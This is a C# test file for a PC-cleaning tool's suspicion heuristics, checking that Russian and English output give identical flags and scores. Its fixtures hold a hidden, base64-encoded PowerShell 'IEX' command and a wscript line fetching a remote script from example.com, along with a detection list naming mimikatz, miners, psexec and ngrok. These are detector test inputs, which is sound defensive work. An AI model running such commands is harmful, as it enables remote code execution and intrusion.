using System.IO;
using System.Text.RegularExpressions;
using PcCleaner.Core;
using PcCleaner.Modules.Processes;
using PcCleaner.Modules.Programs;
using PcCleaner.Modules.Startup;
using PcCleaner.Tests.Startup;
using Xunit;

namespace PcCleaner.Tests.Core;

/// <summary>
/// The reasons why something looks suspicious or unwanted (Core/Suspicion.cs, Core/KnownPups.cs) in English (the real en.json), and
/// the proof that what the program DECIDES from them — the score, the level, the flags, the kind of install folder, whether a known
/// unwanted program was already found — is the same in Russian and in English: no rule reads the words of a reason any more.
/// Runs alone (the language is process-wide) and always switches back to Russian.
/// </summary>
[Collection(LanguageSequentialCollection.Name)]
public class SuspicionEnglishTests
{
    private static readonly Regex Cyrillic = new("[\u0400-\u04FF]");

    private static readonly SignatureInfo Unsigned = new(SignatureStatus.Unsigned, null);
    private static readonly SignatureInfo Valid = new(SignatureStatus.Valid, "Vendor Co");
    private static readonly SignatureInfo Broken = new(SignatureStatus.Invalid, "Vendor Co");

    public SuspicionEnglishTests() => TestEnvironment.Init();

    private static string InTemp(string name) => Path.Combine(Path.GetTempPath(), name);

    private static string Downloads(string name) => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads", name);

    private const string HiddenPowerShell = "powershell.exe -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA";

    private static SuspicionResult InEnglish(Func<SuspicionResult> analyze)
    {
        using (TestLanguage.English())
            return analyze();
    }

    /// <summary>The cases of the analysis: the path, the signature, the command line and the flag every case must produce.</summary>
    public static IEnumerable<object?[]> FileCases()
    {
        yield return new object?[] { InTemp("svchost.exe"), Unsigned, null, SuspicionFlags.SystemNameOutsideWindows | SuspicionFlags.RiskyLocation | SuspicionFlags.Unsigned };
        yield return new object?[] { InTemp("a8f3k2x9q1.exe"), Unsigned, null, SuspicionFlags.RandomName };
        yield return new object?[] { @"C:\Tools\invoice.pdf.exe", Unsigned, null, SuspicionFlags.DoubleExtension };
        yield return new object?[] { @"C:\Tools\scvhost.exe", Broken, null, SuspicionFlags.LookalikeName | SuspicionFlags.InvalidSignature };
        yield return new object?[] { @"C:\Tools\tool.exe", Unsigned, HiddenPowerShell, SuspicionFlags.HiddenPowerShell };
        yield return new object?[] { @"C:\Tools\tool.exe", Unsigned, "wscript.exe //B http://example.com/x.vbs", SuspicionFlags.ScriptLauncher | SuspicionFlags.UrlInCommand };
        yield return new object?[] { @"C:\Tools\OneLaunch.exe", Unsigned, null, SuspicionFlags.KnownPup };
        yield return new object?[] { @"C:\Tools\xmrig.exe", Unsigned, null, SuspicionFlags.RiskyTool };
        yield return new object?[] { Downloads("setup.exe"), new SignatureInfo(SignatureStatus.Untrusted, "Vendor Co"), null, SuspicionFlags.RiskyLocation | SuspicionFlags.UntrustedSignature };
        yield return new object?[] { @"C:\Users\Public\tool.exe", null, null, SuspicionFlags.RiskyLocation };
        yield return new object?[] { @"D:\$Recycle.Bin\S-1-5-21\tool.exe", null, null, SuspicionFlags.RiskyLocation };
        // A valid signature lowers the score but never hides a hard signal, in either language.
        yield return new object?[] { @"C:\Program Files\Vendor\app.exe", Valid, HiddenPowerShell, SuspicionFlags.HiddenPowerShell };
        yield return new object?[] { @"C:\Program Files\Vendor\OneLaunch.exe", Valid, null, SuspicionFlags.KnownPup };
    }

    [Theory]
    [MemberData(nameof(FileCases))]
    public void TheAnalysisOfAFile_DecidesTheSameInRussianAndInEnglish(string path, SignatureInfo? signature, string? commandLine, SuspicionFlags expected)
    {
        var ru = Suspicion.Analyze(path, signature, commandLine);
        var en = InEnglish(() => Suspicion.Analyze(path, signature, commandLine));

        Assert.True(ru.Flags.HasFlag(expected), $"{path}: {ru.Flags} lacks {expected}");
        Assert.Equal(ru.Score, en.Score);
        Assert.Equal(ru.Level, en.Level);
        Assert.Equal(ru.IsSuspicious, en.IsSuspicious);
        Assert.Equal(ru.Flags, en.Flags);
        Assert.Equal(ru.Reasons.Count, en.Reasons.Count);
        Assert.All(ru.Reasons, r => Assert.True(Cyrillic.IsMatch(r), r));
        Assert.All(en.Reasons, r => Assert.False(Cyrillic.IsMatch(r), r));
        Assert.NotEqual(ru.ReasonsText, en.ReasonsText);
    }

    [Fact]
    public void TheReasonsOfAnUnsignedFileInTemp_AreEnglishSentences()
    {
        var en = InEnglish(() => Suspicion.Analyze(InTemp("svchost.exe"), Unsigned));

        Assert.Equal(
            new[]
            {
                "Named like the Windows system file “svchost.exe”, but not in the Windows folder",
                "Runs from the temporary folder (Temp)",
                "No digital signature",
            },
            en.Reasons);
        Assert.Equal("High risk", InEnglishLevel(en));
    }

    private static string InEnglishLevel(SuspicionResult result)
    {
        using (TestLanguage.English())
            return result.LevelText;
    }

    [Fact]
    public void TheLevelTexts_AreEnglish_AndRussianIsUnchanged()
    {
        Assert.Equal("Высокий риск", new SuspicionResult(70, Array.Empty<string>()).LevelText);
        Assert.Equal("Подозрительно", new SuspicionResult(40, Array.Empty<string>()).LevelText);
        Assert.Equal("Внимание", new SuspicionResult(20, Array.Empty<string>()).LevelText);
        using (TestLanguage.English())
        {
            Assert.Equal("High risk", new SuspicionResult(70, Array.Empty<string>()).LevelText);
            Assert.Equal("Suspicious", new SuspicionResult(40, Array.Empty<string>()).LevelText);
            Assert.Equal("Warning", new SuspicionResult(20, Array.Empty<string>()).LevelText);
            Assert.Equal("OK", SuspicionResult.Clean.LevelText);
        }
    }

    [Fact]
    public void AKnownUnwantedProgram_HasTheEnglishReason_AndTheSameCode()
    {
        var ru = KnownPups.Match("OneLaunch", null);
        string? en;
        using (TestLanguage.English())
            en = KnownPups.Match("OneLaunch", null);

        Assert.Equal("Потенциально нежелательная программа: OneLaunch — рекламная оболочка рабочего стола", ru);
        Assert.Equal("Potentially unwanted program: OneLaunch — an advertising desktop shell", en);
        Assert.Null(KnownPups.Match("Notepad++", "Don Ho"));
    }

    [Fact]
    public void ARiskyTool_HasTheEnglishReason_AndTheSameScore()
    {
        var ru = KnownPups.MatchRiskyTool("AnyDesk.exe");
        (string Reason, int Score)? en;
        using (TestLanguage.English())
            en = KnownPups.MatchRiskyTool("AnyDesk.exe");

        Assert.Equal(15, ru!.Value.Score);
        Assert.Equal(ru.Value.Score, en!.Value.Score);
        Assert.Equal("AnyDesk remote access program — make sure you installed it yourself", en.Value.Reason);
        Assert.StartsWith("Программа удалённого доступа AnyDesk", ru.Value.Reason);
    }

    [Fact]
    public void EveryKnownUnwantedProgramAndRiskyTool_HasAnEnglishReason()
    {
        // The names are the patterns of the tables: a name per row would be a copy of them, so the reasons are read through Match.
        var names = new[]
        {
            "Amigo", "Guard@Mail.ru", "Sputnik@Mail.ru", "Mail.Ru Updater", "Kometa", "Browser Manager", "Yandex Elements", "Mipony", "OneLaunch",
            "Wave Browser", "WebDiscover", "Shift Browser", "Segurazo", "ByteFence", "Reimage", "Restoro", "PC Accelerate", "Advanced SystemCare",
            "Driver Booster", "DriverPack", "Driver Updater", "WinZip Driver", "PC Cleaner Pro", "Web Companion", "Hao123", "Baidu", "Tencent",
            "360 Total Security", "Conduit", "Ask Toolbar", "Babylon", "MyWebSearch", "Search Protect", "Shield Search", "Mindspark",
            "McAfee WebAdvisor", "Avast Secure Browser", "AVG Secure Browser", "CCleaner Browser", "Opera Browser Assistant", "Smart Game Booster",
            "Wise Game Booster", "Razer Cortex", "Auslogics BoostSpeed", "Glary Utilities", "SlimCleaner", "MyPC Backup", "Optimizer Pro",
            "Mobogenie", "ChromeSearch", "Lavasoft", "KMSPico", "KMSAuto", "AutoKMS", "Амиго", "Комета", "Менеджер браузеров", "Элементы Яндекса",
            "Спутник@Mail.ru",
        };
        var tools = new[] { "xmrig", "nicehash", "nbminer", "t-rex", "phoenixminer", "lolminer", "gminer", "mimikatz", "anydesk", "teamviewer", "rustdesk", "ammyy", "radmin", "ngrok", "psexec" };

        using (TestLanguage.English())
        {
            foreach (var name in names)
            {
                var reason = KnownPups.Match(name, null);
                Assert.NotNull(reason);
                Assert.False(Cyrillic.IsMatch(reason!), $"{name}: {reason}");
            }
            foreach (var tool in tools)
            {
                var match = KnownPups.MatchRiskyTool(tool + ".exe");
                Assert.NotNull(match);
                Assert.False(Cyrillic.IsMatch(match!.Value.Reason), $"{tool}: {match.Value.Reason}");
            }
        }
    }

    // ----- an installed program -----

    public static IEnumerable<object?[]> ProgramCases()
    {
        yield return new object?[] { "OneLaunch Browser", null, InTemp("OneLaunch"), SuspicionFlags.KnownPup | SuspicionFlags.NoPublisher | SuspicionFlags.RiskyLocation };
        yield return new object?[] { "Some Tool", "Vendor Co", Downloads("SomeTool"), SuspicionFlags.RiskyLocation };
        yield return new object?[] { "Some Tool", "", @"C:\Users\Public\Tool", SuspicionFlags.NoPublisher | SuspicionFlags.RiskyLocation };
        yield return new object?[] { "Some Tool", "Vendor Co", @"D:\$Recycle.Bin\S-1\Tool", SuspicionFlags.RiskyLocation };
        yield return new object?[] { "Driver Booster", "IObit", @"C:\Program Files\IObit\Driver Booster", SuspicionFlags.KnownPup };
        yield return new object?[] { "Notepad++", "Don Ho", @"C:\Program Files\Notepad++", SuspicionFlags.None };
    }

    [Theory]
    [MemberData(nameof(ProgramCases))]
    public void TheAnalysisOfAProgram_DecidesTheSameInRussianAndInEnglish(string name, string? publisher, string folder, SuspicionFlags expected)
    {
        var ru = ProgramRules.AnalyzeProgram(name, publisher, folder);
        var en = InEnglish(() => ProgramRules.AnalyzeProgram(name, publisher, folder));

        Assert.Equal(expected, ru.Flags);
        Assert.Equal(ru.Score, en.Score);
        Assert.Equal(ru.Level, en.Level);
        Assert.Equal(ru.Flags, en.Flags);
        Assert.Equal(ru.Reasons.Count, en.Reasons.Count);
        Assert.All(en.Reasons, r => Assert.False(Cyrillic.IsMatch(r), r));
    }

    [Fact]
    public void TheEnglishReasonsOfAProgramInTemp_AreEnglishSentences()
    {
        var en = InEnglish(() => ProgramRules.AnalyzeProgram("OneLaunch Browser", null, InTemp("OneLaunch")));

        Assert.Equal(
            new[]
            {
                "Potentially unwanted program: OneLaunch — an advertising desktop shell",
                "Publisher not specified",
                "Installed in the temporary folder (Temp)",
            },
            en.Reasons);
    }

    [Fact]
    public void TheNoteAboutAnInstallFolder_IsChosenByTheKindOfFolder_InBothLanguages()
    {
        var cases = new (string Folder, RiskyLocation Kind)[]
        {
            (InTemp("weird-app"), RiskyLocation.Temp),
            (Downloads("weird-app"), RiskyLocation.Downloads),
            (@"C:\$Recycle.Bin\S-1-5-21-1\$R1A2B3C\app", RiskyLocation.RecycleBin),
            (@"C:\Users\Public\app", RiskyLocation.Public),
            (@"C:\Program Files\Normal App", RiskyLocation.None),
        };

        foreach (var (folder, kind) in cases)
        {
            Assert.Equal(kind, ProgramRules.InstallLocationKind(folder));
            var ru = ProgramRules.DescribeInstallLocationRisk(folder);
            string? en;
            using (TestLanguage.English())
            {
                Assert.Equal(kind, ProgramRules.InstallLocationKind(folder));
                en = ProgramRules.DescribeInstallLocationRisk(folder);
            }

            Assert.Equal(kind == RiskyLocation.None, ru is null);
            Assert.Equal(ru is null, en is null);
            if (en is not null)
            {
                Assert.False(Cyrillic.IsMatch(en), en);
                Assert.NotEqual(ru, en);
            }
        }
        using (TestLanguage.English())
        {
            Assert.Equal("The program is installed in a temporary folder (Temp) — normal programs do not do that.",
                ProgramRules.DescribeInstallLocationRisk(InTemp("weird-app")));
            Assert.Equal("The program's folder is in the Recycle Bin.", ProgramRules.DescribeInstallLocationRisk(@"C:\$Recycle.Bin\S-1\app"));
        }
    }

    [Fact]
    public void TheKindOfAPlace_IsACode_ThatNeedsNoWords()
    {
        Assert.Equal(RiskyLocation.Temp, Suspicion.ClassifyLocation(InTemp("a.exe")));
        Assert.Equal(RiskyLocation.Downloads, Suspicion.ClassifyLocation(Downloads("a.exe")));
        Assert.Equal(RiskyLocation.RecycleBin, Suspicion.ClassifyLocation(@"D:\$Recycle.Bin\S-1\a.exe"));
        Assert.Equal(RiskyLocation.Public, Suspicion.ClassifyLocation(@"C:\Users\Public\a.exe"));
        Assert.Equal(RiskyLocation.None, Suspicion.ClassifyLocation(@"C:\Program Files\App\a.exe"));
        var roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        Assert.Equal(RiskyLocation.AppDataRoot, Suspicion.ClassifyLocation(Path.Combine(roaming, "a.exe")));
        Assert.Equal(RiskyLocation.None, Suspicion.ClassifyLocation(Path.Combine(roaming, "a.exe"), isInstallFolder: true));
        Assert.Equal(RiskyLocation.None, Suspicion.ClassifyLocation("\0 not a path"));
        // the same kinds, the old words of both uses
        Assert.Equal("Запускается из временной папки (Temp)", Suspicion.DescribeRiskyLocation(InTemp("a.exe")));
        Assert.Equal("Установлена во временную папку (Temp)", Suspicion.DescribeRiskyLocation(InTemp("a"), isInstallFolder: true));
        Assert.Equal("Находится в корзине", Suspicion.DescribeRiskyLocation(@"D:\$Recycle.Bin\S-1\a", isInstallFolder: true));
        Assert.Equal("Установлена в общую папку пользователей (Public)", Suspicion.DescribeRiskyLocation(@"C:\Users\Public\a", isInstallFolder: true));
    }

    // ----- the pages that react to a known unwanted program -----

    [Fact]
    public void AStartupEntry_OfAKnownUnwantedProgram_IsJudgedTheSameInRussianAndInEnglish()
    {
        foreach (var signature in new[] { Unsigned, Valid })
        {
            using var sandbox = new StartupSandbox();
            var ru = Reanalyzed(sandbox, signature);
            SuspicionResult en;
            using (TestLanguage.English())
                en = Reanalyzed(sandbox, signature);

            Assert.True(ru.Flags.HasFlag(SuspicionFlags.KnownPup));
            Assert.Equal(ru.Score, en.Score);
            Assert.Equal(ru.Level, en.Level);
            Assert.Equal(ru.Flags, en.Flags);
            Assert.Equal(ru.Reasons.Count, en.Reasons.Count);
            Assert.Equal(1, en.Reasons.Count(r => r.StartsWith("Potentially unwanted program", StringComparison.Ordinal)));
        }
    }

    private static SuspicionResult Reanalyzed(StartupSandbox sandbox, SignatureInfo signature)
    {
        var item = new StartupItem
        {
            Id = $"{StartupKind.RegistryRun}|OneLaunch",
            Kind = StartupKind.RegistryRun,
            Scope = StartupScope.CurrentUser,
            Name = "OneLaunch",
            Command = "\"C:\\Program Files\\Launcher Co\\launcher-app.exe\" /autostart",
            TargetFile = @"C:\Program Files\Launcher Co\launcher-app.exe",
            IsEnabled = true,
        };
        item.Signature = signature;
        item.Publisher = signature.Publisher;
        item.TargetExists = true;
        sandbox.Service.Reanalyze(item);
        return item.Suspicion;
    }

    [Fact]
    public void TheFlags_SurviveWhenAResultIsExtendedOrCombined()
    {
        var hidden = new SuspicionResult(65, new[] { "x" }, SuspicionFlags.HiddenPowerShell);
        var unsigned = new SuspicionResult(20, new[] { "y" }, SuspicionFlags.Unsigned);

        var startup = StartupService.AddPupMatch(unsigned, "pup", Unsigned);
        var process = ProcessesService.AddPupMatch(hidden, "pup", Unsigned);
        var combined = ProcessGrouping.Combine(new SuspicionResult?[] { hidden, unsigned, null })!;
        var miner = MinerHeuristic.Apply(hidden, sustainedHighCpu: true, @"C:\Tools\tool.exe", Unsigned);

        Assert.Equal(SuspicionFlags.Unsigned | SuspicionFlags.KnownPup, startup.Flags);
        Assert.Equal(SuspicionFlags.HiddenPowerShell | SuspicionFlags.KnownPup, process.Flags);
        Assert.Equal(SuspicionFlags.HiddenPowerShell | SuspicionFlags.Unsigned, combined.Flags);
        Assert.Equal(SuspicionFlags.HiddenPowerShell | SuspicionFlags.SustainedCpu, miner.Flags);
        Assert.Equal(55, startup.Score);
        Assert.Equal(new[] { "y", "pup" }, startup.Reasons);
    }

    [Fact]
    public void AResultMadeOfAScoreAndTexts_HasNoFlags()
        => Assert.Equal(SuspicionFlags.None, new SuspicionResult(50, new[] { "Нет цифровой подписи" }).Flags);
}
